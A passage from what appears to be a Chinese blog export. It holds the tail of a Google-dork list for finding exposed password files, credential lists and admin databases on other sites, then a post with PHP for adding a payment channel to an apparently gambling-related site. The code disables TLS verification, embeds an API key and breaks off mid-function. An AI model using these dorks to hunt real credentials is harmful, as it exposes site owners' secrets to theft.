class=\"line\"></span><br><span class=\"line\">“ipconfig”</span><br><span class=\"line\"></span><br><span class=\"line\">“winipconfig”</span><br></pre></td></tr></table></figure></p>\n<p>google缓存利用，搜索时候多”选搜索所有网站”</p>\n<p>特别推荐：administrator users 等相关的东西，比如名字，生日等……最惨也可以拿来做字典</p>\n<p>一些技巧集合：</p>\n<p>1) index.of.password</p>\n<p>1) filetype:blt “buddylist”</p>\n<p>2) “access denied for user” “using password”</p>\n<p>2) intitle:”index of” inurl:ftp (pub | incoming)</p>\n<p>3) “http://:@www” domainname</p>\n<p>3) filetype:cnf inurl:_vti_pvt access.cnf</p>\n<p>4) auth_user_file.txt</p>\n<p>4) allinurl:”//_vti_pvt/” | allinurl:”//_vti_cnf/”</p>\n<p>5) The Master List</p>\n<p>5) inurl:”install/install.php”</p>\n<p>6) allinurl: admin mdb</p>\n<p>6) intitle:”welcome.to.squeezebox”</p>\n<p>7) passlist.txt (a better way)</p>\n<p>7) intext:””BiTBOARD v2.0″ BiTSHiFTERS Bulletin Board”</p>\n<p>8) “A syntax error has occurred” filetype:ihtml</p>\n<p>8) intitle:　Login intext:”RT is ? Copyright”</p>\n<p>9) “# -FrontPage-” inurl:service.pwd</p>\n<p>9) ext:php program_listing intitle:MythWeb.Program.Listing</p>\n<p>10) ORA-00921: unexpected end of SQL command</p>\n<p>10) intitle:index.of abyss.conf</p>"},{"layout":"post","title":"乐购菠菜添加支付方式","password":"Legou","abbrlink":25578,"date":"2019-05-31T12:42:56.000Z","_content":"\n### 前言\n\n突然有一天老板扔给我一个错误百出的文档（文档不规范，码农两行泪），让我往某不知名网站添加某不可描述支付\n\n<!--more-->\n\n### 分析\n\n- 登录后台发现有添加第三方支付的菜单，但是发现只能更改配置，无法添加新的支付方式（知道不会这么简单）\n\n- 进入数据库发现数据存储在`payment_config`表中，试着直接数据库添加查看数据变化，添加后发现只能出现在支付列表中，无法添加和更改配置\n\n- 查看页面请求，直接阅读获取支付代码，发现有一个`pay.json`的配置文件，直接打开，部分代码如下\n\n```json\n[\n    {\n        \"nid\": \"nid_pay\",\n        \"name\": \"请选择类型\",\n        \"merchantID\": \"支付平台提供给商家的账号\",\n        \"terminalID\": \"支付平台提供给商家的终端号\",\n        \"merchantKey\": \"支付平台提供个商家的密码（MD5加密时使用）\",\n        \"merchantPayKey\": \"支付有关的其他秘钥或信息\",\n        \"partnerId\": \"支付平台代理商账号\",\n        \"merchantPrivateKey\": \"用户私钥（与用户公钥成对存在）\",\n        \"merchantPublicKey\": \"用户公钥（与用户私钥成对存在）\",\n        \"platformPublicKey\": \"平台公钥（平台提供，一般在商户登录支付平台后台管理页面获取）\",\n        \"merchantCertPath\": \"商家证书\",\n        \"platformCertPath\": \"平台证书\",\n        \"payBank\": [{\"bank_id\":1,\"code\":\"ICBC\"},{\"bank_id\":2,\"code\":\"ABC\"},{\"bank_id\":9,\"code\":\"BOC\"},{\"bank_id\":7,\"code\":\"CCB\"},\n        \t\t\t{\"bank_id\":10,\"code\":\"COMM\"},{\"bank_id\":11,\"code\":\"CMB\"},{\"bank_id\":14,\"code\":\"SPDB\"},{\"bank_id\":26,\"code\":\"CIB\"},\n        \t\t\t{\"bank_id\":15,\"code\":\"CMBC\"},{\"bank_id\":13,\"code\":\"GDB\"},{\"bank_id\":12,\"code\":\"SPDB\"},{\"bank_id\":8,\"code\":\"CEB\"},\n        \t\t\t{\"bank_id\":29,\"code\":\"HXB\"},{\"bank_id\":3,\"code\":\"PSBC\"},{\"bank_id\":6,\"code\":\"PAB\"}\n    \t\t\t],\n        \"pay_layers\": \"1,2,3,5,4,6,7,8,9,10,11\",\n        \"payType\": [\n\t        {\"id\": 1,\"name\":\"微信扫码支付\",\"payStr\":\"支付配置信息\",\"typeStr\":\"其他支付配置信息\",\"payEntrance\":\"端口类型：1=ios,2=android,3=h5,4=pc\",\"payStatus\":\"是否启用：1:启用;2:禁用\",\"request_type\":\"返回数据or跳转页面：1：返回数据，2:跳转页面\"},\n\t        {\"id\": 2,\"name\":\"微信WAP支付\",\"payStr\":\"WX_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 3,\"name\":\"微信H5支付\",\"payStr\":\"WX_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 4,\"name\":\"支付宝扫码支付\",\"payStr\":\"ALI\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 5,\"name\":\"支付宝WAP支付\",\"payStr\":\"ALI_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 6,\"name\":\"支付宝H5支付\",\"payStr\":\"ALI_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 7,\"name\":\"QQ钱包扫码支付\",\"payStr\":\"QQ\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 8,\"name\":\"QQ钱包WAP支付\",\"payStr\":\"QQ_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 9,\"name\":\"QQ钱包H5支付\",\"payStr\":\"QQ_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 10,\"name\":\"网银支付\",\"payStr\":\"WY\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 11,\"name\":\"网银H5支付\",\"payStr\":\"WY_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 12,\"name\":\"网银快捷支付\",\"payStr\":\"WY_KJ\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n        \t{\"id\": 13,\"name\":\"京东钱包扫码支付\",\"payStr\":\"JD\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 14,\"name\":\"京东钱包WAP支付\",\"payStr\":\"JD_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 15,\"name\":\"京东钱包H5支付\",\"payStr\":\"JD_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 16,\"name\":\"银联钱包扫码支付\",\"payStr\":\"UN\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n\t        {\"id\": 17,\"name\":\"银联钱包WAP支付\",\"payStr\":\"UN_WAP\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n\t        {\"id\": 18,\"name\":\"银联钱包H5支付\",\"payStr\":\"UN_H5\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n          {\"id\": 19,\"name\":\"网关支付扫码\",\"payStr\":\"gateway\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2},\n          {\"id\": 20,\"name\":\"微信公众账号\",\"payStr\":\"weixinjsapi\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n          {\"id\": 21,\"name\":\"支付宝服务窗支付\",\"payStr\":\"weixinjsapi\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n          {\"id\": 22,\"name\":\"支付宝app支付\",\"payStr\":\"alipayapp\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n          {\"id\": 23,\"name\":\"苏宁扫码支付\",\"payStr\":\"suning\",\"typeStr\":\"\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1}\n\t        ],\n        \"sort\": 0\n    },\n    {\n        \"nid\": \"hua_yin_pay\",\n        \"name\": \"华银\",\n        \"merchantID\": \"\",\n        \"merchantPrivateKey\": \"\",\n        \"merchantPublicKey\": \"\",\n        \"platformPublicKey\": \"\",\n        \"payType\": [\n        \t{\"id\": 1,\"name\":\"微信扫码支付\",\"payStr\":\"weixin_scan\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n        \t{\"id\": 4,\"name\":\"支付宝扫码支付\",\"payStr\":\"alipay_scan\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n        \t{\"id\": 7,\"name\":\"QQ钱包宝扫码支付\",\"payStr\":\"tenpay_scan\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":1},\n        \t{\"id\": 10,\"name\":\"网银支付\",\"payStr\":\"direct_pay\",\"payEntrance\":\"1,2,3,4\",\"payStatus\":1,\"request_type\":2}\n        ]\n    },\n]\n```\n\n思路已经清晰了，直接从文件中添加了一个新的支付配置，果然后台支付列表中出现了，添加上该支付的配置参数\n\n- 添加后，发起支付，报无此支付方式的错误，直接在代码中搜索这个错误信息，找到这个`PayFactory.php`工厂类，部分代码如下\n\n```php\n<?php\n\n/**\n * Created by Kevin.\n * @author kevin\n * @copyright HCHT 2017/9/15 17:06\n * @description 支付工厂类\n */\n\ninclude_cache(S_CORE . 'class' . DS . 'pay'  . DS . 'chengyi.php');\n\nclass PayFactory\n{\n\tpublic function getInterface($payMent)\n\t{\n        switch ($payMent) {\n            case 'cheng_yi_pay':\n                return new cheng_yi_pay();\n                break;\n            default:\n                ErrorCode::errorResponse(200015, '线上支付方式不存在');\n        }\n\t}\n}\n```\n\n思路已经很明朗了，创建一个支付类，添加上case分支\n\n- 随便打开一个支付类，根据它的部分逻辑，接入新的支付逻辑，处理异步回调时，发现有两个回调可供选择，一个在`recharge.php`中，一个在根目录下的`rechargeNotify.php`中，同步回调在根目录下`beeePayOk.php`，具体可阅读代码，没有必要张贴\n\n### 实现\n具体的支付类代码，仅供参考，每个支付的具体实现都有差别\n\n```php\n\n\n<?php\n\n/**\n * @description 诚意支付\n */\n\ninclude_cache(S_CORE . 'class' . DS . 'pay' . DS . 'payinfo' . '.php');\n\nclass ChengYiPay extends PayInfo\n{\n    //请求接口Url\n    public $url      = 'https://pay.chenyipay.com/api/pay/v2';\n    //接口名称\n    public $payName  = '诚意支付';\n\n    //获取支付返回数据格式\n    public $retArr = [               //支付信息返回格式\n            'code' => 1,             //0:数据获取成功，其他数字，数据获取失败\n            'msg' => '',             //返回的提示信息\n            'data' => []             //返回数据\n        ];\n\n    //回调处理返回数据格式\n    public $orderInfo = [            //异步验签结果返回格式\n        'code' => 0,                 //0：数据获取成功，其他数字，数据获取失败\n        'bank_num' => 219050,        //银行区分号（不同支付的前三位不同）\n        'order_no' => '',            //后台数据库支付订单号\n        'amount' => 0,               //支付金额\n        'ret_error' => 0,            //回调处理失败时，返回接口字符串\n        'ret_success' => 'ok',        //回调处理成功时，返回接口字符串\n        'bank_name' => '诚意支付',     //支付方式名称\n        'serial_no' => ''            //第三方回调返回的第三方支付订单号（支付流水号）\n    ];\n\n    /**\n     * 构成函数\n     */\n    public function __construct()\n    {\n        parent::__construct();\n    }\n\n    /**\n     * 调用第三方支付接口，获取支付信息\n     * @param array $data 前端返回信息，payment_id，支付类型ID，config，支付类型配置信息\n     * {@inheritDoc}\n     * @see PayInfo::doPay()\n     * @return $this->$retArr;\n     */\n    public function doPay($data)\n    {\n        //生成订单\n        $orderInfo = $this->makeOrder($data);\n        if (!$orderInfo) {\n            $this->retArr['code'] = 219000;\n            $this->retArr['msg']  = '支付订单生成失败';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '订单生成失败，' . print_r($data, true));\n\n            return $this->retArr;\n        }\n\n        //获取配置支付信息\n        $config      = unserialize($data['config']);\n        $callbackurl = $config['callbackurl']?$config['callbackurl']:$_SERVER['HTTP_HOST'];\n\n        if (empty($data['pay_type']) || empty($config['payType'][$data['pay_type']])) {\n            $this->retArr['code'] = 219001;\n            $this->retArr['msg']  = '支付银行类型不存在';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '银行类型不存在，' . print_r($data, true));\n\n            return $this->retArr;\n        }\n\n        $postData = [\n            'p1_mchtid'   => $config['merchantID'],\n            'p2_paytype'  => $config['payType'][$data['pay_type']]['payStr'],\n            'p3_paymoney' => $data['money'],\n            'p4_orderno'  => $orderInfo,\n            //异步\n            'p5_callbackurl' => \"http://\".$callbackurl.\"/?m=api&c=recharge&a=rechargeNotify&payment_id=\" . $data['payment_id'],\n            //同步\n            'p6_notifyurl' => \"http://\".$callbackurl.\"/beeePayOk.php\",\n            'p7_version'   => 'v2.9',\n            'p8_signtype'  => '2',\n            'p9_attach'    => 'chengyi_' . $data['payment_id'],\n            'p10_appname'  => '',\n            'p11_isshow'   => '0',\n            'p12_orderip'  => ip(),\n            'p13_memberid' => $data['user_id'],\n        ];\n\n        payLog('chengyi.txt',print_r($postData,true));\n\n        //待签名字符串\n        $signStr   = $this->get_sign($postData);\n        //生成签名\n        $postData[\"sign\"] = md5($signStr.$config['merchantKey']);\n        //转为json字符串\n        $jsonStr   = json_encode($postData);\n        //获取公钥\n        $publicKey = $this->publicKeyStr($config['merchantPublicKey']);\n        //公钥加密\n        $reqdata   = urlencode($this->publicEncrypt($publicKey, $jsonStr));\n        //请求参数\n        $signData[\"mchtid\"]  = $config['merchantID'];\n        $signData[\"reqdata\"] = $reqdata;\n\n        //判断支付网关是否是wap\n        if ($config['payType'][$data['pay_type']]['request_type'] == 2) {\n            $retData =  [\n                'type'  => $config['payType'][$data['pay_type']]['request_type'],\n                'modes' => $data['pay_model'],\n                'html'  => $this->paramToHtmlForm($this->url, $signData)\n            ];\n\n            $this->retArr['code'] = 0;\n            $this->retArr['data']  = $retData;\n\n            return $this->retArr;\n        }\n\n        //发起请求\n        $result = $this->httpRequest($this->url, json_encode($signData));\n        //将json字符串转为数组\n        $resultArr = json_decode($result,true);\n        //判断返回信息\n        if ($resultArr['rspCode'] != 1 && !$resultArr['data']) {\n            $this->retArr['code'] = 219002;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . $resultArr[\"rspMsg\"] . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        $resultData = $resultArr['data'];\n        //验签\n        $re = $this->payVerify($resultData, $config['merchantKey']);\n\n        if (!$re) {\n            $this->retArr['code'] = 219003;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '验签失败' . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        payLog('chengyi.txt',print_r($resultData, true). \"===134\");\n\n\n        $retOderNo           = $orderInfo;\n        $retOderPayNo        = isset($resultData['r2_systemorderno']) ? $resultData['r2_systemorderno'] : 'chengyipay' . date('YmdHis');\n        $retOderPayQrcodrUrl = isset($resultData['r6_qrcode']) ? $resultData['r6_qrcode'] : '';\n\n        $result = D('accountRecharge')->getOneCoupon('id', array('order_sn' => $retOderNo, 'status' => 0));\n\n        if (empty($result)) {\n            $this->retArr['code'] = 219004;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '返回数据成功,但订单表没有查到相应未完成的订单号，' . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        D('accountRecharge')->save(['remark' => $retOderPayNo], ['order_sn' => $retOderNo]);\n\n        // 用于安全验证返回url是否非法\n        $shortQrcodrUrl =$this->shortUrl($retOderPayQrcodrUrl, '5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda');\n        if (!$shortQrcodrUrl) {\n            $this->retArr['code'] = 219005;\n            $this->retArr['msg']  = '支付二维码生成失败！';\n            payLog('payerror.log', '（' . $this->retArr['code'] . '）' . $this->payName . '二维码获取成功，但转换短链接失败' . print_r($resultArr, true));\n\n            return $this->retArr;\n        }\n\n        session::set('qrcode_url', $shortQrcodrUrl);\n        session::set('pay_url', '');\n\n        //type =1 返回二维码数据\n        $ret =  [\n            'type'     => $config['payType'][$data['pay_type']]['request_type'],\n            'code_url' => $shortQrcodrUrl,\n            'pay_url'  => '',\n            'order_no' => $orderInfo,\n            'modes'    => $data['pay_model']\n        ];\n\n        $this->retArr['code'] = 0;\n        $this->retArr['data'] = $ret;\n\n        return $this->retArr;\n    }\n\n    /**\n     * 支付回调处理\n     * @param array $postData data：回调返回的数据，payment_Id：支付类型ID\n     * {@inheritDoc}\n     * @see PayInfo::doPaycallBack()\n     * @return array $this->$retArr;\n     */\n    public function doPaycallBack($postData)\n    {\n        //接收回调后 返回 ok;\n        echo 'ok';\n\n        //处理post回调数据\n        $data       = json_decode($postData['data'], true);\n        $reqdata    = $data['reqdata'];\n        $config     = unserialize($postData['config']);\n\n        payLog('chengyi.txt',print_r($postData, true).'----996--');\n\n        //判断字符串是否需要 urldecode解\n        if (strpos($reqdata, '%')) {\n            $reqdata =  urldecode($reqdata);\n        }\n\n        if (!is_array($config)) {\n            $this->orderInfo['code'] = 219020;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知,获取数据库配置错误！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        if (!$reqdata) {\n            $this->orderInfo['code'] = 219021;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知:获取重要参数错误！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        //获取私钥\n        $private_key = $this->privateKeyStr($config['merchantPrivateKey']);\n        //解密\n        $dataJson    = $this->privateDecrypt($reqdata, $private_key);\n\n        if (!$dataJson) {\n            $this->orderInfo['code'] = 219022;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知：支付解密失败！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        $arr = json_decode($dataJson, true);\n        $arr['partner'] = $config['merchantID'];\n\n        //去除不需要参入验签的字段\n        unset($arr[\"sysnumber\"]);\n        unset($arr[\"attach\"]);\n\n        //验证签名\n        $re = $this->payVerify($arr, $config['merchantKey']);\n\n        if (!$re) {\n            $this->orderInfo['code'] = 219023;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知：验签失败！'  . print_r($arr, true));\n\n            return $this->orderInfo;\n        }\n\n        if (!isset($arr['orderstatus']) || $arr['orderstatus'] != 1 ) {\n            $this->orderInfo['code'] = 219024;\n            payLog('payerror.log', '（' . $this->orderInfo['code'] . '）支付异步通知：支付失败！'  . print_r($data, true));\n\n            return $this->orderInfo;\n        }\n\n        $this->orderInfo['code']  = 0;\n        $this->orderInfo['order_no']  = $data['ordernumber'];\n        $this->orderInfo['amount']    = $data['paymoney'];\n        $this->orderInfo['serial_no'] = $data['sysnumber'];\n\n        return $this->orderInfo;\n    }\n\n\n    /**\n     * [get_sign 拼接签名字符串]\n     * @param  [type] $arr 数组\n     * @return [type]      [description]\n     */\n    public  function get_sign($arr)\n    {\n\t\t$signmd5=\"\";\n\t\tforeach($arr as $x=>$x_value)\n\t\t{\n\t\t\tif($signmd5==\"\"){\n\t\t\t\t$signmd5 =$signmd5.$x .'='. $x_value;\n\t\t\t}else{\n\t\t\t\t$signmd5 = $signmd5.'&'.$x .'='. $x_value;\n\t\t\t}\n\n\t\t}\n\t\treturn $signmd5;\n    }\n\n    /**\n     * [publicKeyStr 公钥字符串处理]\n     * @param  [type] $publicStr 公钥字符串\n     * @return [type]            [description]\n     */\n    public   function publicKeyStr($publicStr)\n    {\n        $public_key = \"-----BEGIN PUBLIC KEY-----\\r\\n\";\n        foreach (str_split($publicStr,64) as $str){\n            $public_key .= $str . \"\\r\\n\";\n        }\n        $public_key .=\"-----END PUBLIC KEY-----\";\n\n        return $public_key;\n    }\n\n    /**\n      * [publicEncrypt 公钥加密]\n      * @param  [type] $publicKey 公钥\n      * @param  [type] $data      加密字符串\n      * @return [type]            [description]\n      */\n      public  function publicEncrypt($publicKey, $data)\n      {\n        $key = openssl_get_publickey($publicKey);\n\n        $original_arr = str_split($data,117);\n        foreach($original_arr as $o) {\n            $sub_enc = null;\n            openssl_public_encrypt($o,$sub_enc,$key);\n            $original_enc_arr[] = $sub_enc;\n        }\n\n        openssl_free_key($key);\n        $original_enc_str = base64_encode(implode('',$original_enc_arr));\n\n        return $original_enc_str;\n    }\n\n    /**\n     * [paramToHtmlForm form表单方法]\n     * @param  [type] $url    请求URL\n     * @param  [type] $params 数组 请求参数\n     * @return [type]         [description]\n     */\n    public  function paramToHtmlForm($url,$params)\n    {\n        $def_url = \"<form id='form' name='payForm' action='\".$url.\"' method='POST'>\\r\";\n        foreach ($params as $key => $value) {\n            $def_url .=\"<input type='hidden' name='\".$key.\"' value='\".$value.\"'>\\r\";\n        }\n        $def_url .=\"<input type='submit' value='确认提交'></form><script language='javascript'>window.onload=function(){document.payForm.submit();}</script>\";\n\n        return $def_url;\n    }\n\n    /**\n     * [httpRequest http请求]\n     * @param  [type] $url  请求URL\n     * @param  [type] $data 请求参数 json字符串\n     * @return [type]       [description]\n     */\n    public  function httpRequest($url,$data)\n    {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, \"POST\");\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);\n        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)');\n        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json','Content-Length: ' . strlen($data)));\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        $tmpInfo = curl_exec($ch);\n        if (curl_errno($ch)) {\n            return curl_error($ch);\n        }\n\n        return $tmpInfo;\n    }\n\n    /**\n     *[payVerify 支付付验签]\n     * @param  [type] $result [返回的参数]\n     * @return [type] $md5    [MD5]\n     */\n\n    public function payVerify($result,$md5)\n    {\n        $signStr = $result['sign'];\n        $sign_array = array();\n        foreach ($result as $k => $v) {\n            if ($k !== 'sign'){\n                $sign_array[$k] = $v;\n            }\n        }\n        $sign  = md5($this->get_sign($sign_array).$md5);\n        if($signStr != $sign){\n            return false;\n        }\n\n        return true;\n    }\n\n    function CurlQuery($url)\n    {\n        //设置附加HTTP头\n        $addHead = array(\n            \"Content-type: application/json\"\n        );\n        $curl_obj = curl_init();\n        curl_setopt($curl_obj, CURLOPT_URL, $url);\n        curl_setopt($curl_obj, CURLOPT_HTTPHEADER, $addHead);\n        curl_setopt($curl_obj, CURLOPT_HEADER, 0);\n        curl_setopt($curl_obj, CURLOPT_RETURNTRANSFER, 1);\n        curl_setopt($curl_obj, CURLOPT_TIMEOUT, 15);\n        $result = curl_exec($curl_obj);\n        curl_close($curl_obj);\n\n        return $result;\n  }\n\n    //根据长网址获取短网址\n    function shortUrl($long_url, $appkey)\n    {\n        $long_url = urlencode($long_url);\n        $url = 'http://mrw.so/api.php?format=json&url=' . $long_url . '&key=' . $appkey . '&expireDate=' . date(\"Y-m-d\",strtotime(\"+3 day\"));\n\n        //获取请求结果\n        $result = $this->CurlQuery($url);\n        $json = json_decode($result);\n        //异常情况返回false\n        if ($json->err) {\n            return false;\n        }\n\n        return $json->url;\n    }\n\n     /**\n     * 提交表单数据\n     * @param array $post_data 表单提交数据\n     * @param string $url 表单提交接口\n     * @return string\n     */\n    function httpHtml($post_data, $url)\n    {\n        $html = '<html>';\n        $html = '<head>';\n        $html .= '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">';\n        $html .= '</head>';\n        $html .= '<body onLoad=\"document.dinpayForm.submit();\">';\n        $html .= '<form id=\"payFrom\" name=\"dinpayForm\" method=\"get\" action=\"' . $url . '\">';\n        foreach ($post_data as $key => $value) {\n            $html .= '<input type=\"hidden\" name=\"' . $key . '\" value=\"' . $value . '\"/>';\n        }\n        $html .= '</form>';\n        $html .= '</body>';\n        $html .= '</html>';\n        return $html;\n    }\n\n     /**\n     * 调用第三方接口，提交数据\n     * @param string $url 第三方接口url\n     * @param array $postdata 提交数据\n     * @return array[]|mixed[] 返回数据\n     */\n    public function httpPost($data, $url, $path='')\n    {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_POST, 1);\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\n        curl_setopt($ch, CURLOPT_CAINFO, $path);\n        curl_setopt($ch, CURLOPT_HEADER, 0);\n        curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: application/json; charset=utf-8','Content-Length:' . strlen($data)));\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);\n\n        $response = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        return array('code' => $httpCode, 'data' => $response);\n    }\n\n    /**\n     * [privateKeyStr 私钥钥字符串处理]\n     * @param  [type] $privatekey [description]\n     * @return [type]             [description]\n     */\n    public function privateKeyStr($privatekey)\n    {\n        $private_key = \"-----BEGIN PRIVATE KEY-----\\r\\n\";\n        foreach (str_split($privatekey,64) as $str){\n            $private_key .= $str . \"\\r\\n\";\n        }\n        $private_key .=\"-----END PRIVATE KEY-----\";\n\n        return $private_key;\n    }\n\n    /**\n     * [decode 私钥解密]\n     * @param  [type] $data       [待解密字符串]\n     * @param  [type] $privateKey [私钥]\n     * @return [type]             [description]\n     */\n    public function privateDecrypt($data,$privateKey)\n    {\n        //读取秘钥\n        $pr_key = openssl_pkey_get_private($privateKey);\n        if ($pr_key == false){\n            echo \"打开密钥出错\";\n            die;\n        }\n        $data = base64_decode($data);\n        $crypto = '';\n        //分段解密\n        foreach (str_split($data, 128) as $chunk) {\n            openssl_private_decrypt($chunk, $decryptData, $pr_key);\n            $crypto .= $decryptData;\n        }\n\n        return $crypto;\n    }\n\n}\n```\n\n- rechargeNotify回调核心代码\n\n```php\n\n<?php\n/**\n * desc: 处理线上支付无参数路由支付回调处理方法：通过url调用执行该文件，获取相关支付确认信息后，通过curl转发到带参数路由的api接口\n */\ndefine('S_ROOT', dirname(__FILE__) . DIRECTORY_SEPARATOR);\n//require S_ROOT . 'core' . DIRECTORY_SEPARATOR . 'base.php';\n\n$data       = [];  //支付回调数据\n$payData    = '';  //支付回传的支付参数，规定：使用\"_\"将支付名称与支付ID连接起来，如兄弟支付：'xiongdi_123'\n$payType    = '';  //支付类型\n$payment_id = '';  //支付方式ID\n\n//不同的支付方式获取数据的方式可能不同，根据不同的支付，添加不同的获取回调数据的方法，如：$_GET\\$_POST\\$_REQUEST\\（php://input）\n$postData = file_get_contents(\"php://input\");  //获取post参数字符串类型数据\npayLog('callbackRecharge.txt',print_r($postData,true).'---23---');\n\n//数据处理，不同的支付方式，可能数据处理方式不同\nif  (!empty($postData)) {\n    if (!simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA)) {\n       parse_str($postData, $data);\n    } else {\n        $data = json_decode(json_encode(simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA)), true);\n    }\n    payLog('callbackRecharge.txt',print_r($postData,true).'---20---' . print_r(simplexml_load_string($postData, 'SimpleXMLElement', LIBXML_NOCDATA),true));\n} else {\n    $data = $_REQUEST;\n}\n\npayLog('callbackRecharge.txt',print_r($data,true).'---26---');\n\nif (!empty($data)) {\n    payLog('callbackRecharge.txt', '异步充值接参数通知数据：' . print_r($data, true));  //日志，记录转接数据\n\n    if (isset($data['pay_attach'])) {\n        $payData = explode('_', $data['pay_attach']);\n    }\n\n    if (empty($payData)) {\n        exit('0');\n    }\n\n    $payType    = $payData[0] ?? '';\n    $payment_id = $payData[1] ?? '';\n}\n\n\nif (!empty($data) && !empty($payment_id)) {\n\n    payLog('curlRecharge.log', '异步充值url转接参数通知数据：' . print_r($data, true));  //日志，记录转接数据\n\n    $ret = httpPostApi($data, $payment_id);   //异步充值通知转接\n    payLog('callbackRecharge.txt',print_r($ret,true).'----73--');\n\n    echo $ret;  //输出结果数据\n}\n\n\n/**\n * 充值异步转接接口调用，post数据转发，表单提交数据库格式\n * @param array $payData  需要转发的数据\n * @param int $paymentId  线上支付方式ID\n * @return mixed|number   返回数据\n */\nfunction httpPostApi($payData, $paymentId)\n{\n    //路由api接口\n    $payUrl = \"https://\".$_SERVER['HTTP_HOST'].\"/?m=api&c=recharge&a=rechargeNotify&payment_id=\" . $paymentId;\n\n    $ch = curl_init();\n    curl_setopt($ch,CURLOPT_URL, $payUrl);\n    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n    curl_setopt($ch, CURLOPT_POST, true);\n    curl_setopt($ch, CURLOPT_HEADER, false);\n    curl_setopt($ch, 